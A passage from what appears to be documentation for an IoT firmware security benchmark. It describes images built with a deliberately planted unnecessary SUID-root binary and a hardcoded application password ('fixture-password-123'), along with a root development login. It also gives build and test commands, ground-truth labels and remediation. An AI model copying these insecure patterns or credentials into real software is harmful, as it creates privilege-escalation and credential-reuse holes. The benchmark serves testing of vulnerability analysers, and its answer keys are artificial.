the kernel is `Image` in the same directory.

The relevant executable is `/usr/bin/iotbench-suid-fixture`, owned by
**root:root (UID/GID 0:0)** with mode **4755 (`-rwsr-xr-x`)**. Its **SUID bit is
enabled** and group/other execute bits plus traversable parents make it
reachable by the synthetic unprivileged `suidfixture` user (UID/GID 993). The
permission is dangerous because this harmless identity reporter receives root's
effective UID despite needing no root privilege. It prints only the static
fixture marker and real/effective identities, accepts no arguments and opens no
files; it provides no exploit or command execution.

Expected static finding: root ownership, executable permissions, unnecessary
SUID and non-root accessibility at that path. Expected ground-truth label:
**Privilege escalation risk caused by dangerous SUID rights (CWE-250)**.
Relevant metadata and the warning are in
`/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` and `NOTICE`.
Secure remediation: install the helper with mode **0755**, remove SUID and
update the fixture's metadata assertion for the corrected build. Its benign
behavior then works with the caller's effective UID.

Local build and boot from the host repository root:

```bash
FIRMWARE=router-cwe250-dangerous-suid-rights docker compose run --rm yocto
FIRMWARE=router-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

Local static verification, without booting:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/router-cwe250-dangerous-suid-rights/qemuarm64/iotbench-router-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Local runtime verification from the guest root console:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected: `root:root 4755 -rwsr-xr-x`, the fixed benign marker, `REAL_UID=993`
and `EFFECTIVE_UID=0`. Alternatively, the host runner boots and verifies this
device's exported image:

```bash
python3 scripts/test-dangerous-suid-rights.py --device router
```

### Dangerous SUID Rights — smartbulb

Simulated device: **lighting smart bulb**, retaining its existing MQTT lighting
telemetry and `meta-iotbench/recipes-devices/smartbulb/` profile. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartbulb-cwe250-dangerous-suid-rights.bb`.
Firmware directory:
`deploy-images/smartbulb-cwe250-dangerous-suid-rights/<machine>/`. For the
default machine, the rootfs is
`deploy-images/smartbulb-cwe250-dangerous-suid-rights/qemuarm64/iotbench-smartbulb-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in the same directory.

The relevant executable is `/usr/bin/iotbench-suid-fixture`, owned by
**root:root (UID/GID 0:0)** with mode **4755 (`-rwsr-xr-x`)**. Its **SUID bit is
enabled** and group/other execute bits plus traversable parents make it
reachable by the synthetic unprivileged `suidfixture` user (UID/GID 993). The
permission is dangerous because this harmless identity reporter receives root's
effective UID despite needing no root privilege. It prints only the static
fixture marker and real/effective identities, accepts no arguments and opens no
files; it provides no exploit or command execution.

Expected static finding: root ownership, executable permissions, unnecessary
SUID and non-root accessibility at that path. Expected ground-truth label:
**Privilege escalation risk caused by dangerous SUID rights (CWE-250)**.
Relevant metadata and the warning are in
`/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` and `NOTICE`.
Secure remediation: install the helper with mode **0755**, remove SUID and
update the fixture's metadata assertion for the corrected build. Its benign
behavior then works with the caller's effective UID.

Local build and boot from the host repository root:

```bash
FIRMWARE=smartbulb-cwe250-dangerous-suid-rights docker compose run --rm yocto
FIRMWARE=smartbulb-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

Local static verification, without booting:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/smartbulb-cwe250-dangerous-suid-rights/qemuarm64/iotbench-smartbulb-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Local runtime verification from the guest root console:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected: `root:root 4755 -rwsr-xr-x`, the fixed benign marker, `REAL_UID=993`
and `EFFECTIVE_UID=0`. Alternatively, the host runner boots and verifies this
device's exported image:

```bash
python3 scripts/test-dangerous-suid-rights.py --device smartbulb
```

### Dangerous SUID Rights — smarthub

Simulated device: **controller/smart hub**, retaining its existing MQTT hub
telemetry and `meta-iotbench/recipes-devices/smarthub/` profile. Image recipe:
`meta-iotbench/recipes-images/iotbench-smarthub-cwe250-dangerous-suid-rights.bb`.
Firmware directory:
`deploy-images/smarthub-cwe250-dangerous-suid-rights/<machine>/`. For the
default machine, the rootfs is
`deploy-images/smarthub-cwe250-dangerous-suid-rights/qemuarm64/iotbench-smarthub-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in the same directory.

The relevant executable is `/usr/bin/iotbench-suid-fixture`, owned by
**root:root (UID/GID 0:0)** with mode **4755 (`-rwsr-xr-x`)**. Its **SUID bit is
enabled** and group/other execute bits plus traversable parents make it
reachable by the synthetic unprivileged `suidfixture` user (UID/GID 993). The
permission is dangerous because this harmless identity reporter receives root's
effective UID despite needing no root privilege. It prints only the static
fixture marker and real/effective identities, accepts no arguments and opens no
files; it provides no exploit or command execution.

Expected static finding: root ownership, executable permissions, unnecessary
SUID and non-root accessibility at that path. Expected ground-truth label:
**Privilege escalation risk caused by dangerous SUID rights (CWE-250)**.
Relevant metadata and the warning are in
`/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` and `NOTICE`.
Secure remediation: install the helper with mode **0755**, remove SUID and
update the fixture's metadata assertion for the corrected build. Its benign
behavior then works with the caller's effective UID.

Local build and boot from the host repository root:

```bash
FIRMWARE=smarthub-cwe250-dangerous-suid-rights docker compose run --rm yocto
FIRMWARE=smarthub-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

Local static verification, without booting:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/smarthub-cwe250-dangerous-suid-rights/qemuarm64/iotbench-smarthub-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Local runtime verification from the guest root console:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected: `root:root 4755 -rwsr-xr-x`, the fixed benign marker, `REAL_UID=993`
and `EFFECTIVE_UID=0`. Alternatively, the host runner boots and verifies this
device's exported image:

```bash
python3 scripts/test-dangerous-suid-rights.py --device smarthub
```

### Dangerous SUID Rights — smartplug

Simulated device: **energy-management smart plug**, retaining its existing MQTT
power telemetry and `meta-iotbench/recipes-devices/smartplug/` profile. Image
recipe:
`meta-iotbench/recipes-images/iotbench-smartplug-cwe250-dangerous-suid-rights.bb`.
Firmware directory:
`deploy-images/smartplug-cwe250-dangerous-suid-rights/<machine>/`. For the
default machine, the rootfs is
`deploy-images/smartplug-cwe250-dangerous-suid-rights/qemuarm64/iotbench-smartplug-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in the same directory.

The relevant executable is `/usr/bin/iotbench-suid-fixture`, owned by
**root:root (UID/GID 0:0)** with mode **4755 (`-rwsr-xr-x`)**. Its **SUID bit is
enabled** and group/other execute bits plus traversable parents make it
reachable by the synthetic unprivileged `suidfixture` user (UID/GID 993). The
permission is dangerous because this harmless identity reporter receives root's
effective UID despite needing no root privilege. It prints only the static
fixture marker and real/effective identities, accepts no arguments and opens no
files; it provides no exploit or command execution.

Expected static finding: root ownership, executable permissions, unnecessary
SUID and non-root accessibility at that path. Expected ground-truth label:
**Privilege escalation risk caused by dangerous SUID rights (CWE-250)**.
Relevant metadata and the warning are in
`/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` and `NOTICE`.
Secure remediation: install the helper with mode **0755**, remove SUID and
update the fixture's metadata assertion for the corrected build. Its benign
behavior then works with the caller's effective UID.

Local build and boot from the host repository root:

```bash
FIRMWARE=smartplug-cwe250-dangerous-suid-rights docker compose run --rm yocto
FIRMWARE=smartplug-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

Local static verification, without booting:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/smartplug-cwe250-dangerous-suid-rights/qemuarm64/iotbench-smartplug-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Local runtime verification from the guest root console:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected: `root:root 4755 -rwsr-xr-x`, the fixed benign marker, `REAL_UID=993`
and `EFFECTIVE_UID=0`. Alternatively, the host runner boots and verifies this
device's exported image:

```bash
python3 scripts/test-dangerous-suid-rights.py --device smartplug
```

### Dangerous SUID Rights — smartspeaker

Simulated device: **audio/voice-assistant smart speaker**, retaining its
existing MQTT audio telemetry and `meta-iotbench/recipes-devices/smartspeaker/`
profile. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartspeaker-cwe250-dangerous-suid-rights.bb`.
Firmware directory:
`deploy-images/smartspeaker-cwe250-dangerous-suid-rights/<machine>/`. For the
default machine, the rootfs is
`deploy-images/smartspeaker-cwe250-dangerous-suid-rights/qemuarm64/iotbench-smartspeaker-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in the same directory.

The relevant executable is `/usr/bin/iotbench-suid-fixture`, owned by
**root:root (UID/GID 0:0)** with mode **4755 (`-rwsr-xr-x`)**. Its **SUID bit is
enabled** and group/other execute bits plus traversable parents make it
reachable by the synthetic unprivileged `suidfixture` user (UID/GID 993). The
permission is dangerous because this harmless identity reporter receives root's
effective UID despite needing no root privilege. It prints only the static
fixture marker and real/effective identities, accepts no arguments and opens no
files; it provides no exploit or command execution.

Expected static finding: root ownership, executable permissions, unnecessary
SUID and non-root accessibility at that path. Expected ground-truth label:
**Privilege escalation risk caused by dangerous SUID rights (CWE-250)**.
Relevant metadata and the warning are in
`/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` and `NOTICE`.
Secure remediation: install the helper with mode **0755**, remove SUID and
update the fixture's metadata assertion for the corrected build. Its benign
behavior then works with the caller's effective UID.

Local build and boot from the host repository root:

```bash
FIRMWARE=smartspeaker-cwe250-dangerous-suid-rights docker compose run --rm yocto
FIRMWARE=smartspeaker-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

Local static verification, without booting:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/smartspeaker-cwe250-dangerous-suid-rights/qemuarm64/iotbench-smartspeaker-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Local runtime verification from the guest root console:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected: `root:root 4755 -rwsr-xr-x`, the fixed benign marker, `REAL_UID=993`
and `EFFECTIVE_UID=0`. Alternatively, the host runner boots and verifies this
device's exported image:

```bash
python3 scripts/test-dangerous-suid-rights.py --device smartspeaker
```

### Dangerous SUID Rights — thermostat

Simulated device: **climate-control thermostat**, retaining its existing MQTT
climate telemetry and `meta-iotbench/recipes-devices/thermostat/` profile. Image
recipe:
`meta-iotbench/recipes-images/iotbench-thermostat-cwe250-dangerous-suid-rights.bb`.
Firmware directory:
`deploy-images/thermostat-cwe250-dangerous-suid-rights/<machine>/`. For the
default machine, the rootfs is
`deploy-images/thermostat-cwe250-dangerous-suid-rights/qemuarm64/iotbench-thermostat-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in the same directory.

The relevant executable is `/usr/bin/iotbench-suid-fixture`, owned by
**root:root (UID/GID 0:0)** with mode **4755 (`-rwsr-xr-x`)**. Its **SUID bit is
enabled** and group/other execute bits plus traversable parents make it
reachable by the synthetic unprivileged `suidfixture` user (UID/GID 993). The
permission is dangerous because this harmless identity reporter receives root's
effective UID despite needing no root privilege. It prints only the static
fixture marker and real/effective identities, accepts no arguments and opens no
files; it provides no exploit or command execution.

Expected static finding: root ownership, executable permissions, unnecessary
SUID and non-root accessibility at that path. Expected ground-truth label:
**Privilege escalation risk caused by dangerous SUID rights (CWE-250)**.
Relevant metadata and the warning are in
`/usr/share/iotbench/dangerous-suid-rights/ground-truth.json` and `NOTICE`.
Secure remediation: install the helper with mode **0755**, remove SUID and
update the fixture's metadata assertion for the corrected build. Its benign
behavior then works with the caller's effective UID.

Local build and boot from the host repository root:

```bash
FIRMWARE=thermostat-cwe250-dangerous-suid-rights docker compose run --rm yocto
FIRMWARE=thermostat-cwe250-dangerous-suid-rights ./scripts/run-qemu.sh
```

Local static verification, without booting:

```bash
python3 scripts/test-dangerous-suid-rights.py --image \
  deploy-images/thermostat-cwe250-dangerous-suid-rights/qemuarm64/iotbench-thermostat-cwe250-dangerous-suid-rights-qemuarm64.rootfs.ext4.zst
```

Local runtime verification from the guest root console:

```bash
stat -c '%U:%G %a %A' /usr/bin/iotbench-suid-fixture
setpriv --reuid=993 --regid=993 --clear-groups /usr/bin/iotbench-suid-fixture
```

Expected: `root:root 4755 -rwsr-xr-x`, the fixed benign marker, `REAL_UID=993`
and `EFFECTIVE_UID=0`. Alternatively, the host runner boots and verifies this
device's exported image:

```bash
python3 scripts/test-dangerous-suid-rights.py --device thermostat
```


## Hardcoded Credentials — Hardcoding User Passwords

### Build, boot and manual testing

**What this tests.** Local application authentication uses a fixed password
shipped in the firmware. The synthetic account returns a success marker;
it is not an SSH account or a Linux login.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe798-hardcoded-user-passwords docker compose run --rm yocto
QEMU_HTTP_PORT=18080 FIRMWARE=router-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
```

**Test — guest:**

```sh
cat /etc/iotbench/hardcoded-user-passwords/accounts.conf
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
echo "exit=$?"
printf '%s\n' 'fixture-password-wrong' | iotbench-fixture-auth fixtureuser
echo "exit=$?"
```

Expected: the file contains `fixtureuser:fixture-password-123`; the correct
password produces `HARDCODED_USER_PASSWORD_ACCEPTED`,
`AUTHENTICATED_AS=fixtureuser` and `exit=0`. The incorrect password produces
`FIXTURE_AUTH_REJECTED` and `exit=1`. This comparison confirms that the
embedded credential is used by the authentication check.

> INTENTIONALLY INSECURE SYNTHETIC TEST FIXTURE — LOCAL SECURITY TESTING ONLY — NOT FOR DEPLOYMENT

### Scenario and actual authentication evidence

The eleven `<device>-cwe798-hardcoded-user-passwords` images combine the
existing common image and corresponding device profile with exactly one
vulnerability package, `cwe798-hardcoded-user-passwords`. This is separate from
the HTTP vendor-support images documented earlier. The package adds local
application authentication and requires no network connection or remote login.
The shared dashboard, simulator and native telemetry are supplied by the normal
device profiles; this fixture adds no service, web action or network listener.

The modeled vulnerability is specifically **a fixed synthetic user password
embedded directly in the firmware and reused deterministically, resulting in
CWE-798: Use of Hard-coded Credentials**. The exact expected ground-truth label
is **Hardcoded credentials — Hardcoding the user passwords**. The corresponding
weakness is **CWE-798 — Use of Hard-coded Credentials**.

The local application account is `fixtureuser`. Its fake, fixture-exclusive
password is `fixture-password-123`. The source account database is
`meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/files/accounts.conf`:

~~~text
fixtureuser:fixture-password-123
~~~

The recipe copies these bytes verbatim into
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` during `do_install`.
The file format is one `username:plaintext-password` record. No random password,
per-device input, environment override, installer enrollment, postinstall hook
or first-boot provisioning supplies this credential. Every fresh image, copied
image and installation therefore begins with the same account and password,
including across device types and architectures. Device identity and peripheral
specifications remain device-specific; the fixture account record is identical.

The installed `/usr/bin/iotbench-fixture-auth` is the actual credential
consumer. It reads the fixed account database using `IFS=: read -r`, reads the
submitted password from stdin and compares both the submitted account name and
password with the stored fields. Only a match prints
`HARDCODED_USER_PASSWORD_ACCEPTED`, `AUTHENTICATED_AS=fixtureuser` and the
benign marker `FIXTURE_ONLY=BENIGN_LOCAL_AUTHENTICATION`, exiting zero.
A wrong username or password, empty input or stdin EOF exits 1 without the
success marker. Missing/empty account storage or a wrong argument count exits 2.
The input password must be a newline-terminated line; all inputs are treated as
data, never sourced, evaluated, used as filenames or executed.

This is a synthetic **application account**, following the existing CWE-798
application-identity convention. It does not create an OS user, alter
`/etc/passwd` or `/etc/shadow`, grant a shell, run a command on authentication,
change privileges or store a login session. The helper only reads its fixed
configuration and prints a marker. Run it from the existing guest root serial
console to read the root-only database; authenticating `fixtureuser` grants no
root privilege. Serial-console development credentials belong to the common
image and are separate from the measured fixture account.

### Firmware components and permissions

The vulnerability directory is
`meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`. The recipe uses
local `file://` sources, `S = "${UNPACKDIR}"`, standard Yocto path variables
and the already available BusyBox shell; it adds no layer or source download.
It marks the account database as a configuration file. Source edits followed by
a rebuild change a fixture variant; there is no automatic password change.

| Source under the vulnerability directory | Firmware component / role |
| --- | --- |
| `cwe798-hardcoded-user-passwords_1.0.bb` | Installs the account record verbatim and the local authentication consumer |
| `files/accounts.conf` | `/etc/iotbench/hardcoded-user-passwords/accounts.conf`, root:root `0600`; actual synthetic account/password |
| `files/iotbench-fixture-auth` | `/usr/bin/iotbench-fixture-auth`, root:root `0755`; compares supplied credentials with that record |
| `files/ground-truth.json` | `/usr/share/iotbench/hardcoded-user-passwords/ground-truth.json`, `0644`; account, password, consumer, exact label and CWE |
| `files/NOTICE` | `/usr/share/iotbench/hardcoded-user-passwords/NOTICE`, `0644`; exact warning and synthetic scope |
| `files/test-guest.sh` | `/usr/share/iotbench/hardcoded-user-passwords/test-guest.sh`, `0644`; explicitly invoked local regression |
| `files/LICENSE` | Existing repository MIT license convention |

`meta-iotbench/recipes-images/iotbench-hardcoded-user-passwords.inc` fails
image generation if the credential bytes differ from the source or if the
database/helper ownership and modes change. It appends NOTICE to `/etc/motd`;
the helper itself also prints the exact warning. The database has normal
root-only permissions, and the helper has no SUID/SGID or sudo grant. Those
permissions limit live file access, but an analyzer can extract the plaintext
from the ext4 firmware without authenticating or booting it. The embedded
credential remains recoverable from every distributed copy.

Detection must correlate **a real synthetic account record, a fixed embedded
password, deterministic image installation, and the helper's authentication
comparison**. A random string containing `password`, `passwd`, `credential` or
`secret` is insufficient by itself. Metadata is an annotation of the expected
finding, not a substitute for tracing the actual account-to-consumer relationship.

This differs from generic vulnerable Java/JAR applications and generic vulnerable
C binaries: the package has neither and installs an actual firmware account
configuration and its local shell authentication component. It differs from
unused password-looking sample strings because the stored password controls
authentication. It contains no real leaked credentials: both account and password
are clearly fake and exclusively dedicated to this fixture. Ordinary
`/etc/passwd` entries with no hardcoded password do not establish this scenario,
and neither do password hashes or authentication artifacts lacking a tie to a
deterministic hardcoded account credential. Generic weak-password examples
where a password is supplied externally are also different: here the firmware
itself ships the fixed credential, regardless of a caller's submitted input.

### Shared local build and testing

Run host commands from the repository root. The default machine is `qemuarm64`;
`YOCTO_MACHINE` selects the existing `qemuarm`, `qemux86-64`, `qemux86` or
`qemumips` alternatives. Use the same selector for building and booting.
`scripts/build-all.sh` discovers these eleven image recipes automatically.
To parse and resolve one target without building, use:

~~~bash
docker compose run --rm yocto bash -lc \
  'source /opt/yocto/yocto-env.sh && bitbake -p && bitbake -n iotbench-router-cwe798-hardcoded-user-passwords'
~~~

Build all eleven:

~~~bash
for recipe in meta-iotbench/recipes-images/iotbench-*-cwe798-hardcoded-user-passwords.bb; do
    firmware=$(basename "$recipe" .bb)
    FIRMWARE="${firmware#iotbench-}" docker compose run --rm yocto || exit 1
done
~~~

Each export contains the compressed ext4 rootfs and kernel. Per-device paths
and commands follow below. Log into a manually booted guest through its serial
console using the common `root` / `routeradmin` development login, then run:

~~~bash
cat /etc/iotbench/hardcoded-user-passwords/accounts.conf
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
printf '%s\n' 'fixture-password-wrong' | iotbench-fixture-auth fixtureuser
~~~

Expected: the fixed account record; then the success marker with status zero;
then `FIXTURE_AUTH_REJECTED` with status 1. Authentication needs only the
local files and stdin; no HTTP, SSH, Telnet, FTP, MQTT or Modbus client is used.

The installed `test-guest.sh` verifies deterministic account content, device
identity, normal permissions, repeated success, wrong account/password, missing
or empty input, extra arguments and shell-shaped data rejection. In the
**disposable test snapshot only**, it temporarily replaces the stored password:
the original password must fail and the replacement must succeed. It then checks
that missing/empty credential storage fails closed and restores the original
account record. This is evidence that the helper uses the installed credential;
the temporary test edit is not firmware provisioning or a production fix.
Expected: four `PASS` lines and status zero.

`scripts/test-hardcoded-user-passwords.py --image <path>` inspects an ext4 or
ext4.zst image with `debugfs`, checking credential bytes, the exact installed
consumer/test, ownership, permissions, metadata, device identity and the warning.
It does not mount or execute the firmware. Run it on the host with Python 3,
`zstd` and `debugfs`, or use the existing builder container as in the per-device
commands. Expected: two `PASS` lines and status zero.

The same host runner uses `--device <device>` or `--all` to boot disposable
QEMU snapshots and run the guest regression over the serial console. Run it
separately from a manually running QEMU instance. QEMU and `zstd` must be
installed on the host. For Apple Silicon acceleration and unused host ports:

~~~bash
QEMU_ACCEL=hvf QEMU_CPU=host QEMU_HTTP_PORT=18080 \
  QEMU_MQTT_PORT=21883 QEMU_MODBUS_PORT=11502 \
  python3 scripts/test-hardcoded-user-passwords.py --all
~~~

Console logs are saved in each exported firmware directory as
`validation-console.log`. These host-port settings only support the existing
device profiles; the regression uses no network authentication.

### Safe remediation

For a corrected firmware variant, remove the embedded shared password and enroll
a unique account credential separately for each installation. Keep a salted
password hash in an access-controlled credential store outside the distributable
firmware and support rotation. Merely changing the shared literal, embedding its
hash, hiding it or retaining root-only permissions does not remove deterministic
credential reuse. Verify that the published fixture password no longer succeeds,
that an enrolled credential does succeed locally, and that it fails on another
installation. Rebuild source changes for a lasting variant; QEMU snapshots
discard temporary edits. The known-positive fixture regression must fail its
hardcoded-credential assertion against a properly corrected variant.


### Completed validation

On 2026-10-07, all eleven `qemuarm64` fixtures built and exported successfully
after BitBake parsing and router dependency dry-run validation. Offline
`debugfs` inspection of every compressed ext4 export confirmed the exact
`fixtureuser:fixture-password-123` account record, installed authentication
consumer and guest test, root-owned `0600` database, ordinary `0755` helper,
device identity, metadata and required warning. Account and helper bytes were
identical across all device images.

All eleven images booted in disposable QEMU snapshots using HVF and the host
CPU. Each passed all four guest regression groups, including repeated use of
the fixed password, rejection checks, temporary password replacement proving
credential consumption, and missing/empty database failure with restoration.
The tests used the serial console; authentication required no networking.
Every image manifest contained exactly one vulnerability package,
`cwe798-hardcoded-user-passwords`.

The [local validation report](../deploy-images/hardcoded-user-passwords-qemuarm64-validation.txt)
contains results and rootfs/kernel/helper SHA-256 checksums. Each firmware
export also contains `validation-console.log` and `rootfs.manifest`. Full
build and parse logs are saved as
`deploy-images/hardcoded-user-passwords-qemuarm64-build.log` and
`deploy-images/hardcoded-user-passwords-qemuarm64-parse.log`.
Other supported architectures were not built or boot-tested in this run.
The CWE-798 finding is expected ground truth; validation used actual builds,
filesystem inspection and local authentication, without running an external
firmware-analysis engine.

### Hardcoding User Passwords — doorlock

Simulated device: **access-control door lock**, using the existing
`meta-iotbench/recipes-devices/doorlock/` profile. Firmware directory:
`deploy-images/doorlock-cwe798-hardcoded-user-passwords/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-doorlock-cwe798-hardcoded-user-passwords.bb`.
For the default machine, the rootfs is
`deploy-images/doorlock-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-doorlock-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in that same directory.

Relevant firmware files are
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` (the real local
application account database), `/usr/bin/iotbench-fixture-auth` (its
credential consumer), and `NOTICE`, `ground-truth.json` and `test-guest.sh`
under `/usr/share/iotbench/hardcoded-user-passwords/`. The corresponding
sources are in `meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`.
The device identity remains in `/etc/iotbench/device.conf`.

The synthetic application account is **`fixtureuser`**. Its password,
**`fixture-password-123`**, is hardcoded directly in `accounts.conf` as
`fixtureuser:fixture-password-123`. The package recipe installs this record
verbatim at image build time; the local helper reads it and requires matching
account and password before returning its benign authentication marker.
There is no credential generation, per-device provisioning or external password
source. Thus every copy of this firmware contains the same extractable account
credential, even though the database is root-owned with mode `0600`.

Expected static-analysis finding: trace that installed account record and its
fixed plaintext password into the local helper's authentication comparisons,
then identify deterministic credential reuse. A password-looking string alone
is insufficient. Expected ground-truth label: **Hardcoded credentials —
Hardcoding the user passwords**. Corresponding weakness: **CWE-798 — Use of
Hard-coded Credentials**. Safe remediation: remove the embedded shared password,
enroll a unique credential for this installation and store a salted password hash
outside the distributable image, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=doorlock-cwe798-hardcoded-user-passwords docker compose run --rm yocto
FIRMWARE=doorlock-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
~~~

Local runtime test (inside this guest's root serial console):

~~~bash
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
sh /usr/share/iotbench/hardcoded-user-passwords/test-guest.sh doorlock
~~~

Expected: `HARDCODED_USER_PASSWORD_ACCEPTED` and `AUTHENTICATED_AS=fixtureuser`,
then four regression `PASS` lines; both commands exit zero. Wrong credentials
are rejected with exit 1. The helper grants only a marker, no OS access.
For offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-hardcoded-user-passwords.py \
  --image /export/doorlock-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-doorlock-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Alternatively, let the host runner boot, test and
close this image separately from a manually running guest:

~~~bash
python3 scripts/test-hardcoded-user-passwords.py --device doorlock
~~~


### Hardcoding User Passwords — envsensor

Simulated device: **environmental sensor**, using the existing
`meta-iotbench/recipes-devices/envsensor/` profile. Firmware directory:
`deploy-images/envsensor-cwe798-hardcoded-user-passwords/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-envsensor-cwe798-hardcoded-user-passwords.bb`.
For the default machine, the rootfs is
`deploy-images/envsensor-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-envsensor-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in that same directory.

Relevant firmware files are
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` (the real local
application account database), `/usr/bin/iotbench-fixture-auth` (its
credential consumer), and `NOTICE`, `ground-truth.json` and `test-guest.sh`
under `/usr/share/iotbench/hardcoded-user-passwords/`. The corresponding
sources are in `meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`.
The device identity remains in `/etc/iotbench/device.conf`.

The synthetic application account is **`fixtureuser`**. Its password,
**`fixture-password-123`**, is hardcoded directly in `accounts.conf` as
`fixtureuser:fixture-password-123`. The package recipe installs this record
verbatim at image build time; the local helper reads it and requires matching
account and password before returning its benign authentication marker.
There is no credential generation, per-device provisioning or external password
source. Thus every copy of this firmware contains the same extractable account
credential, even though the database is root-owned with mode `0600`.

Expected static-analysis finding: trace that installed account record and its
fixed plaintext password into the local helper's authentication comparisons,
then identify deterministic credential reuse. A password-looking string alone
is insufficient. Expected ground-truth label: **Hardcoded credentials —
Hardcoding the user passwords**. Corresponding weakness: **CWE-798 — Use of
Hard-coded Credentials**. Safe remediation: remove the embedded shared password,
enroll a unique credential for this installation and store a salted password hash
outside the distributable image, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=envsensor-cwe798-hardcoded-user-passwords docker compose run --rm yocto
FIRMWARE=envsensor-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
~~~

Local runtime test (inside this guest's root serial console):

~~~bash
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
sh /usr/share/iotbench/hardcoded-user-passwords/test-guest.sh envsensor
~~~

Expected: `HARDCODED_USER_PASSWORD_ACCEPTED` and `AUTHENTICATED_AS=fixtureuser`,
then four regression `PASS` lines; both commands exit zero. Wrong credentials
are rejected with exit 1. The helper grants only a marker, no OS access.
For offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-hardcoded-user-passwords.py \
  --image /export/envsensor-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-envsensor-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Alternatively, let the host runner boot, test and
close this image separately from a manually running guest:

~~~bash
python3 scripts/test-hardcoded-user-passwords.py --device envsensor
~~~


### Hardcoding User Passwords — healthmonitor

Simulated device: **health monitor**, using the existing
`meta-iotbench/recipes-devices/healthmonitor/` profile. Firmware directory:
`deploy-images/healthmonitor-cwe798-hardcoded-user-passwords/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-healthmonitor-cwe798-hardcoded-user-passwords.bb`.
For the default machine, the rootfs is
`deploy-images/healthmonitor-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-healthmonitor-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in that same directory.

Relevant firmware files are
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` (the real local
application account database), `/usr/bin/iotbench-fixture-auth` (its
credential consumer), and `NOTICE`, `ground-truth.json` and `test-guest.sh`
under `/usr/share/iotbench/hardcoded-user-passwords/`. The corresponding
sources are in `meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`.
The device identity remains in `/etc/iotbench/device.conf`.

The synthetic application account is **`fixtureuser`**. Its password,
**`fixture-password-123`**, is hardcoded directly in `accounts.conf` as
`fixtureuser:fixture-password-123`. The package recipe installs this record
verbatim at image build time; the local helper reads it and requires matching
account and password before returning its benign authentication marker.
